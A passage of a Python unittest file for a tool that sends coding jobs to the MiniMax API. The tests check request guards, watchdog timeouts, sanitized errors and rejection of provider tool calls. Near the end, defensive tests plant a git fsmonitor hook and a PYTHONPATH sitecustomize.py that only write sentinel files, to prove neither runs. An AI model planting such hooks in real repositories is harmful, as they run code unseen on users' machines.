                self.spec.write_text("Change VALUE to 2 and preserve the contract.\n", encoding="utf-8")
                (self.repo / "src" / "module.py").write_text("VALUE = 1\n", encoding="utf-8")
                created = self._create_job("src/module.py")
                args = argparse.Namespace(
                    repo=str(self.repo),
                    state_dir=str(self.state),
                    job_id=str(created["job_id"]),
                    fish_config=str(self.fish_config),
                    reasoning="none",
                    max_output_tokens=32_000,
                    timeout_seconds=30.0,
                    queue_timeout_seconds=0.0,
                    json=True,
                )

                @contextmanager
                def mutating_slot(mutate_case: Callable[[], object] = mutate) -> Iterator[None]:
                    mutate_case()
                    yield

                with (
                    mock.patch.object(
                        self.module,
                        "global_api_slot",
                        side_effect=lambda _timeout: mutating_slot(),
                    ),
                    mock.patch.object(self.module, "api_create_response") as api_request,
                    self.assertRaises(self.module.WorkerError) as raised,
                ):
                    self.module.command_job_run(args)

                self.assertEqual(raised.exception.code, expected_code)
                api_request.assert_not_called()

    def test_post_is_never_retried_after_ambiguous_transport_error(self) -> None:
        error = self.module.ApiCallError("provider_unreachable", "ambiguous transport failure")
        with (
            mock.patch.object(self.module, "api_json_request", side_effect=error) as request,
            self.assertRaises(self.module.ApiCallError),
        ):
            self.module.api_create_response(
                "https://api.minimax.io/v1",
                TOKEN,
                {"model": "MiniMax-M3", "input": "synthetic"},
                timeout_seconds=1.0,
            )
        self.assertEqual(request.call_count, 1)

    def test_guard_is_durable_before_token_load_and_exactly_fingerprints_post(self) -> None:
        created = self._create_job("src/module.py")
        job_id = str(created["job_id"])
        root = self.module.state_root(self.repo, str(self.state))
        directory, job = self.module.load_job(self.repo, root, job_id)
        payload = self.module.build_api_payload(
            directory,
            job,
            reasoning="none",
            max_output_tokens=32_000,
        )
        request_sha256, exact_request_sha256 = self.module.provider_request_fingerprints(
            self.module.DEFAULT_ENDPOINT,
            payload,
        )
        observed: dict[str, object] = {}

        def fail_token_load(_path: str) -> str:
            current = self.module.read_provider_request_guard(self.module.worker_temp_base())
            self.assertIsNotNone(current)
            assert current is not None
            observed.update(current[2])
            raise self.module.WorkerError("fish_token_missing", "synthetic token failure", exit_code=1)

        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=job_id,
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=30.0,
            queue_timeout_seconds=0.0,
            json=True,
        )
        output = io.StringIO()
        with (
            mock.patch.object(self.module, "load_fish_token", side_effect=fail_token_load),
            mock.patch.object(self.module, "api_create_response") as api_request,
            redirect_stdout(output),
        ):
            code = self.module.command_job_run(args)

        self.assertEqual(code, 1)
        api_request.assert_not_called()
        self.assertEqual(observed["job_id"], job_id)
        self.assertEqual(observed["request_sha256"], request_sha256)
        self.assertEqual(observed["fingerprint"], request_sha256)
        self.assertEqual(observed["exact_request_sha256"], exact_request_sha256)
        self.assertFalse(observed["contains_token"])
        self.assertNotIn(TOKEN, json.dumps(observed, sort_keys=True))
        _, terminal = self.module.load_job(self.repo, root, job_id)
        self.assertEqual(terminal["status"], "FAILED")
        self.assertEqual(terminal["request"]["outcome"], "not_sent")
        self.assertIsNone(self.module.read_provider_request_guard(self.module.worker_temp_base()))

    def test_unclassified_post_failure_keeps_guard_and_blocks_all_future_posts(self) -> None:
        first = self._create_job("src/module.py")
        second = self._create_job("src/module.py")
        first_id = str(first["job_id"])
        second_id = str(second["job_id"])
        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=first_id,
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=30.0,
            queue_timeout_seconds=0.0,
            json=True,
        )
        output = io.StringIO()
        ambiguous = self.module.ApiCallError("provider_post_outcome_ambiguous", "synthetic ambiguity")
        with (
            mock.patch.object(self.module, "supervised_api_create_response", side_effect=ambiguous),
            redirect_stdout(output),
        ):
            code = self.module.command_job_run(args)
        self.assertEqual(code, 1)

        current = self.module.read_provider_request_guard(self.module.worker_temp_base())
        self.assertIsNotNone(current)
        assert current is not None
        guard_data, guard_metadata, guard = current
        self.assertEqual(guard["job_id"], first_id)
        try:
            root = self.module.state_root(self.repo, str(self.state))
            _, failed = self.module.load_job(self.repo, root, first_id)
            self.assertEqual(failed["request"]["outcome"], "ambiguous")

            create_result, create_payload = self._worker(
                "job",
                "create",
                "--cloud-approved",
                "--spec",
                "task.md",
                "--allow-path",
                "src/module.py",
            )
            self.assertEqual(create_result.returncode, 1)
            self.assertEqual(create_payload["error"]["code"], "provider_concurrency_poisoned")

            second_args = argparse.Namespace(**{**vars(args), "job_id": second_id})
            with (
                mock.patch.object(self.module, "api_create_response") as second_post,
                self.assertRaises(self.module.WorkerError) as blocked,
            ):
                self.module.command_job_run(second_args)
            self.assertEqual(blocked.exception.code, "provider_concurrency_poisoned")
            second_post.assert_not_called()

            list_result, listing = self._worker("job", "list")
            self.assertEqual(list_result.returncode, 0)
            self.assertTrue(listing["provider_request_guard"]["blocks_posts"])
            self.assertEqual(listing["provider_request_guard"]["job_id"], first_id)

            doctor_result, doctor = self._worker("doctor")
            self.assertEqual(doctor_result.returncode, 1)
            self.assertFalse(doctor["ready"])
            self.assertTrue(doctor["provider_request_guard"]["blocks_posts"])

            purge_args = argparse.Namespace(
                job_id=first_id,
                json=True,
                repo=str(self.repo),
                state_dir=str(self.state),
            )
            with self.assertRaises(self.module.WorkerError) as purge_error:
                self.module.command_job_purge(purge_args)
            self.assertEqual(purge_error.exception.code, "job_referenced_by_provider_guard")
        finally:
            self.module.remove_provider_request_guard(
                guard_data,
                (guard_metadata.st_dev, guard_metadata.st_ino),
                missing_ok=True,
            )

    def test_post_watchdog_kills_blocked_child_and_retains_ambiguous_guard(self) -> None:
        created = self._create_job("src/module.py")
        job_id = str(created["job_id"])
        started = self.root / "watchdog-post-started"

        def blocked_post(*_args: object, **_kwargs: object) -> dict[str, object]:
            started.write_text("one-post\n", encoding="utf-8")
            time.sleep(10.0)
            raise AssertionError("watchdog failed to terminate blocked POST")

        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=job_id,
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=0.2,
            queue_timeout_seconds=0.0,
            json=True,
        )
        output = io.StringIO()
        before = time.monotonic()
        with mock.patch.object(self.module, "api_create_response", side_effect=blocked_post), redirect_stdout(output):
            code = self.module.command_job_run(args)
        elapsed = time.monotonic() - before

        self.assertEqual(code, 1)
        self.assertLess(elapsed, 2.0)
        self.assertEqual(started.read_text(encoding="utf-8"), "one-post\n")
        result = json.loads(output.getvalue())
        self.assertEqual(result["status"], "FAILED")
        self.assertEqual(result["error"]["code"], "provider_deadline_exceeded")
        self.assertEqual(result["provider"]["outcome"], "ambiguous")
        self.assertFalse(any((self.state / job_id).glob(".response-watchdog-*")))
        current = self.module.read_provider_request_guard(self.module.worker_temp_base())
        self.assertIsNotNone(current)
        assert current is not None
        guard_data, guard_metadata, guard = current
        self.assertEqual(guard["job_id"], job_id)
        self.assertEqual(guard["attempt"], 1)
        self.assertRegex(guard["exact_request_sha256"], r"^[0-9a-f]{64}$")
        try:
            with (
                self.assertRaises(self.module.WorkerError) as slot_error,
                self.module.global_api_slot(0.0),
            ):
                self.fail("ambiguous provider request guard must block every later API slot")
            self.assertEqual(slot_error.exception.code, "provider_concurrency_poisoned")

            with (
                mock.patch.object(self.module, "api_create_response", side_effect=blocked_post),
                self.assertRaises(self.module.WorkerError) as raised,
            ):
                self.module.command_job_run(args)
            self.assertEqual(raised.exception.code, "provider_concurrency_poisoned")
            self.assertEqual(started.read_text(encoding="utf-8"), "one-post\n")
        finally:
            self.module.remove_provider_request_guard(
                guard_data,
                (guard_metadata.st_dev, guard_metadata.st_ino),
                missing_ok=True,
            )

        with self.assertRaises(self.module.WorkerError) as terminal:
            self.module.command_job_run(args)
        self.assertEqual(terminal.exception.code, "job_not_runnable")

    def test_sigkill_supervisor_during_post_blocks_a_second_job_without_replay(self) -> None:
        first = self._create_job("src/module.py")
        second = self._create_job("src/module.py")
        first_id = str(first["job_id"])
        second_id = str(second["job_id"])
        started = self.root / "sigkill-post-started"
        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=first_id,
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=30.0,
            queue_timeout_seconds=0.0,
            json=True,
        )

        supervisor_pid = os.fork()
        if supervisor_pid == 0:
            def blocked_post(*_args: object, **_kwargs: object) -> dict[str, object]:
                started.write_text(f"{os.getpid()}\n", encoding="utf-8")
                time.sleep(10.0)
                raise AssertionError("provider child should die with its supervisor")

            try:
                self.module.api_create_response = blocked_post
                self.module.command_job_run(args)
            finally:
                os._exit(0)

        supervisor_reaped = False
        try:
            deadline = time.monotonic() + 5.0
            while time.monotonic() < deadline:
                current = self.module.read_provider_request_guard(self.module.worker_temp_base())
                if started.exists() and current is not None:
                    break
                time.sleep(0.02)
            else:
                self.fail("supervised provider child did not reach the synthetic POST")

            os.kill(supervisor_pid, self.module.signal.SIGKILL)
            waited_pid, waited_status = os.waitpid(supervisor_pid, 0)
            supervisor_reaped = True
            self.assertEqual(waited_pid, supervisor_pid)
            self.assertTrue(os.WIFSIGNALED(waited_status))
            self.assertEqual(os.WTERMSIG(waited_status), self.module.signal.SIGKILL)
            provider_pid = int(started.read_text(encoding="utf-8").strip())
            self.assertGreater(provider_pid, 1)
            child_deadline = time.monotonic() + 2.0
            while time.monotonic() < child_deadline:
                try:
                    process_stat = Path(f"/proc/{provider_pid}/stat").read_text(encoding="utf-8")
                except FileNotFoundError:
                    break
                if process_stat.split()[2] == "Z":
                    break
                time.sleep(0.02)
            else:
                self.fail("PDEATHSIG did not terminate the provider watchdog child")

            current = self.module.read_provider_request_guard(self.module.worker_temp_base())
            self.assertIsNotNone(current)
            assert current is not None
            guard_data, guard_metadata, guard = current
            self.assertEqual(guard["job_id"], first_id)
            self.assertEqual(guard["supervisor_pid"], supervisor_pid)
            try:
                root = self.module.state_root(self.repo, str(self.state))
                _, interrupted = self.module.load_job(self.repo, root, first_id)
                self.assertEqual(interrupted["status"], "RUNNING")
                self.assertEqual(interrupted["request"]["outcome"], "unconfirmed")

                second_args = argparse.Namespace(**{**vars(args), "job_id": second_id})
                with (
                    mock.patch.object(self.module, "api_create_response") as second_post,
                    self.assertRaises(self.module.WorkerError) as blocked,
                ):
                    self.module.command_job_run(second_args)
                self.assertEqual(blocked.exception.code, "provider_concurrency_poisoned")
                second_post.assert_not_called()
                self.assertEqual(int(started.read_text(encoding="utf-8").strip()), provider_pid)
            finally:
                self.module.remove_provider_request_guard(
                    guard_data,
                    (guard_metadata.st_dev, guard_metadata.st_ino),
                    missing_ok=True,
                )
        finally:
            if not supervisor_reaped:
                with suppress(ProcessLookupError):
                    os.kill(supervisor_pid, self.module.signal.SIGKILL)
                with suppress(ChildProcessError):
                    os.waitpid(supervisor_pid, 0)

    def test_watchdog_parent_death_arm_failure_prevents_post(self) -> None:
        created = self._create_job("src/module.py")
        job_id = str(created["job_id"])
        sentinel = self.root / "post-must-not-run"

        def forbidden_post(*_args: object, **_kwargs: object) -> dict[str, object]:
            sentinel.write_text("called\n", encoding="utf-8")
            return {}

        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=job_id,
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=1.0,
            queue_timeout_seconds=0.0,
            json=True,
        )
        output = io.StringIO()
        with (
            mock.patch.object(self.module, "_arm_watchdog_parent_death_signal", return_value=False),
            mock.patch.object(self.module, "api_create_response", side_effect=forbidden_post),
            redirect_stdout(output),
        ):
            code = self.module.command_job_run(args)
        result = json.loads(output.getvalue())
        self.assertEqual(code, 1)
        self.assertEqual(result["error"]["code"], "provider_watchdog_start_failed")
        self.assertEqual(result["provider"]["outcome"], "not_sent")
        self.assertFalse(sentinel.exists())
        self.assertFalse(any((self.state / job_id).glob(".response-watchdog-*")))
        self.assertIsNone(self.module.read_provider_request_guard(self.module.worker_temp_base()))

    def test_model_probe_has_a_total_watchdog_deadline(self) -> None:
        started = self.root / "model-probe-started"

        def blocked_probe(*_args: object, **_kwargs: object) -> dict[str, object]:
            started.write_text("started\n", encoding="utf-8")
            time.sleep(10.0)
            return {}

        args = argparse.Namespace(
            endpoint=self.module.DEFAULT_ENDPOINT,
            fish_config=str(self.fish_config),
            timeout_seconds=0.2,
            retries=2,
            json=True,
        )
        before = time.monotonic()
        with (
            mock.patch.object(self.module, "api_list_models", side_effect=blocked_probe),
            self.assertRaises(self.module.ApiCallError) as raised,
        ):
            self.module.command_probe(args)
        self.assertLess(time.monotonic() - before, 2.0)
        self.assertEqual(raised.exception.code, "provider_deadline_exceeded")
        self.assertEqual(started.read_text(encoding="utf-8"), "started\n")
        self.assertFalse(any(self.module.worker_temp_base().glob(".response-watchdog-*")))

    def test_process_dump_hardening_failure_prevents_token_load_and_post(self) -> None:
        created = self._create_job("src/module.py")
        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=str(created["job_id"]),
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=30.0,
            queue_timeout_seconds=0.0,
            json=True,
        )
        with (
            mock.patch.object(self.module, "_disable_sensitive_process_dumping", return_value=False),
            mock.patch.object(self.module, "load_fish_token") as token_loader,
            mock.patch.object(self.module, "api_create_response") as api_request,
            self.assertRaises(self.module.WorkerError) as raised,
        ):
            self.module.command_job_run(args)
        self.assertEqual(raised.exception.code, "sensitive_process_hardening_failed")
        token_loader.assert_not_called()
        api_request.assert_not_called()

    def test_http_errors_preserve_only_sanitized_minimax_status_codes(self) -> None:
        cases = (
            (1002, "rate_limited"),
            (1008, "insufficient_balance"),
            (2056, "token_plan_quota_exhausted"),
        )
        for provider_code, expected_code in cases:
            with self.subTest(provider_code=provider_code):
                body = json.dumps(
                    {
                        "base_resp": {
                            "status_code": provider_code,
                            "status_msg": "must-not-be-persisted",
                        }
                    }
                ).encode()
                error = self.module.urllib.error.HTTPError(
                    "https://api.minimax.io/v1/responses",
                    400,
                    "Bad Request",
                    {},
                    io.BytesIO(body),
                )
                opener = mock.Mock()
                opener.open.side_effect = error
                with (
                    mock.patch.object(self.module, "api_opener", return_value=opener),
                    self.assertRaises(self.module.ApiCallError) as raised,
                ):
                    self.module.api_json_request(
                        "https://api.minimax.io/v1",
                        "responses",
                        TOKEN,
                        method="POST",
                        payload={"model": "MiniMax-M3", "input": "synthetic"},
                        timeout_seconds=1.0,
                    )

                self.assertEqual(raised.exception.code, expected_code)
                self.assertEqual(
                    raised.exception.provider_details,
                    {"provider_status_code": provider_code},
                )
                self.assertNotIn("must-not-be-persisted", str(raised.exception))
                self.assertTrue(error.fp.closed)

    def test_incomplete_provider_response_preserves_usage_and_reason(self) -> None:
        raw_response = {
            "id": "resp-incomplete",
            "object": "response",
            "model": "MiniMax-M3",
            "status": "incomplete",
            "output": [],
            "usage": {
                "input_tokens": 120,
                "input_tokens_details": {"cached_tokens": 20},
                "output_tokens": 10,
                "output_tokens_details": {"reasoning_tokens": 4},
                "total_tokens": 130,
            },
            "incomplete_details": {"reason": "max_output_tokens"},
        }
        with (
            mock.patch.object(self.module, "api_json_request", return_value=raw_response),
            self.assertRaises(self.module.ApiCallError) as raised,
        ):
            self.module.api_create_response(
                "https://api.minimax.io/v1",
                TOKEN,
                {"model": "MiniMax-M3", "input": "synthetic"},
                timeout_seconds=1.0,
            )
        self.assertEqual(raised.exception.code, "provider_incomplete")
        details = raised.exception.provider_details
        self.assertEqual(details["response_id"], "resp-incomplete")
        self.assertEqual(details["usage"]["total_tokens"], 130)
        self.assertEqual(details["incomplete_reason"], "max_output_tokens")

    def test_completed_response_can_extract_documented_output_content(self) -> None:
        raw_response = {
            "id": "resp-completed",
            "object": "response",
            "model": "MiniMax-M3",
            "status": "completed",
            "output": [
                {
                    "type": "message",
                    "content": [{"type": "output_text", "text": VALID_PATCH}],
                }
            ],
            "output_text": None,
            "usage": {"input_tokens": "invalid", "total_tokens": 123},
        }
        with mock.patch.object(self.module, "api_json_request", return_value=raw_response):
            parsed = self.module.api_create_response(
                "https://api.minimax.io/v1",
                TOKEN,
                {"model": "MiniMax-M3", "input": "synthetic"},
                timeout_seconds=1.0,
            )

        self.assertEqual(parsed["output_text"], VALID_PATCH)
        self.assertIsNone(parsed["usage"]["input_tokens"])
        self.assertEqual(parsed["usage"]["total_tokens"], 123)

    def test_response_rejects_every_unexpected_tool_or_content_item(self) -> None:
        base = {
            "id": "resp-tool",
            "object": "response",
            "model": "MiniMax-M3",
            "status": "completed",
            "output_text": VALID_PATCH,
            "usage": {},
        }
        cases = (
            [{"type": "custom_tool_call", "name": "run"}],
            [{"type": "computer_call"}],
            [{"type": "web_search_call"}],
            [{"type": "message", "content": [{"type": "refusal", "refusal": "no"}]}],
        )
        for output in cases:
            with (
                self.subTest(output=output),
                mock.patch.object(self.module, "api_json_request", return_value={**base, "output": output}),
                self.assertRaises(self.module.ApiCallError) as raised,
            ):
                self.module.api_create_response(
                    self.module.DEFAULT_ENDPOINT,
                    TOKEN,
                    {"model": self.module.DEFAULT_MODEL, "input": "synthetic"},
                    timeout_seconds=1.0,
                )
            self.assertEqual(raised.exception.code, "provider_tool_call_denied")

    def test_failed_job_persists_sanitized_provider_usage(self) -> None:
        created = self._create_job("src/module.py")
        provider = {
            "response_id": "resp-failed",
            "model": "MiniMax-M3",
            "status": "failed",
            "usage": {
                "input_tokens": 80,
                "cached_tokens": 10,
                "output_tokens": 2,
                "reasoning_tokens": 0,
                "total_tokens": 82,
            },
            "provider_error": {"code": "provider_internal", "type": "server_error"},
        }
        error = self.module.ApiCallError(
            "provider_failed",
            "MiniMax response failed",
            provider_details=provider,
        )
        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=str(created["job_id"]),
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=20_000,
            timeout_seconds=30.0,
            queue_timeout_seconds=0.0,
            json=True,
        )
        output = io.StringIO()
        with mock.patch.object(self.module, "api_create_response", side_effect=error), redirect_stdout(output):
            return_code = self.module.command_job_run(args)
        emitted = json.loads(output.getvalue())

        self.assertEqual(return_code, 1)
        self.assertEqual(emitted["provider"]["usage"]["total_tokens"], 82)
        _, status = self._worker("job", "status", str(created["job_id"]))
        self.assertEqual(status["result"]["provider"]["response_id"], "resp-failed")
        self.assertEqual(status["result"]["provider"]["usage"]["total_tokens"], 82)

    def test_tls_ignores_keylog_and_proxy_environment(self) -> None:
        keylog = self.root / "keys.log"
        with mock.patch.dict(
            os.environ,
            {
                "SSLKEYLOGFILE": str(keylog),
                "HTTPS_PROXY": "http://127.0.0.1:9",
                "ALL_PROXY": "http://127.0.0.1:9",
            },
            clear=False,
        ):
            context = self.module.tls_context()
            opener = self.module.api_opener()
        self.assertIsNone(context.keylog_filename)
        self.assertFalse(keylog.exists())
        self.assertIsNotNone(opener)

    def test_export_path_is_deterministic_and_rejects_symlink(self) -> None:
        created = self._create_job("src/module.py")
        job_id = str(created["job_id"])
        code, _ = self._mock_run(job_id, VALID_PATCH)
        self.assertEqual(code, 0)
        exports = self.module.ensure_private_subdirectory(
            self.module.worker_temp_base(),
            "exports",
            "Worker patch exports",
        )
        target = self.root / "must-not-change.patch"
        target.write_text("sentinel\n", encoding="utf-8")
        os.symlink(target, exports / f"{job_id}.patch")

        result, payload = self._worker("job", "diff", job_id)

        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "patch_export_invalid")
        self.assertEqual(target.read_text(encoding="utf-8"), "sentinel\n")

    def test_diff_uses_job_lock_and_cannot_race_purge(self) -> None:
        created = self._create_job("src/module.py")
        job_id = str(created["job_id"])
        code, _ = self._mock_run(job_id, VALID_PATCH)
        self.assertEqual(code, 0)
        directory = self.state / job_id
        descriptor = self.module.acquire_job_lock(directory)
        try:
            result, payload = self._worker("job", "diff", job_id)
            self.assertEqual(result.returncode, 1)
            self.assertEqual(payload["error"]["code"], "job_locked")
        finally:
            self.module.release_job_lock(descriptor)

        exported_result, exported = self._worker("job", "diff", job_id)
        self.assertEqual(exported_result.returncode, 0)
        self.assertTrue(Path(str(exported["patch"])).is_file())

    def test_source_git_disables_repo_fsmonitor_hook(self) -> None:
        sentinel = self.root / "fsmonitor-ran"
        hook = self.root / "fsmonitor.sh"
        hook.write_text(f"#!/bin/sh\ntouch '{sentinel}'\n", encoding="utf-8")
        hook.chmod(0o700)
        self._git("config", "core.fsmonitor", str(hook))

        created = self._create_job("src/module.py")

        self.assertEqual(created["status"], "CREATED")
        self.assertFalse(sentinel.exists())

    def test_source_git_core_worktree_cannot_redirect_repository(self) -> None:
        redirected = self.root / "redirected-repo"
        redirected.mkdir()
        self._git("config", "core.worktree", str(redirected))

        with self.assertRaises(self.module.WorkerError) as raised:
            self.module.resolve_repo(str(self.repo))

        self.assertEqual(raised.exception.code, "repo_toplevel_mismatch")

    def test_executable_uses_isolated_system_python(self) -> None:
        hostile = self.root / "pythonpath"
        hostile.mkdir()
        sentinel = self.root / "sitecustomize-ran"
        (hostile / "sitecustomize.py").write_text(
            f"from pathlib import Path\nPath({str(sentinel)!r}).write_text('ran')\n",
            encoding="utf-8",
        )
        environment = dict(os.environ)
        environment["PYTHONPATH"] = str(hostile)

        result = subprocess.run(  # noqa: S603 - verifies the fixed executable under hostile env
            [str(WORKER), "--version"],
            check=False,
            text=True,
            capture_output=True,
            env=environment,
        )

        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.strip(), self.module.VERSION)
        self.assertFalse(sentinel.exists())


if __name__ == "__main__":
    unittest.main()
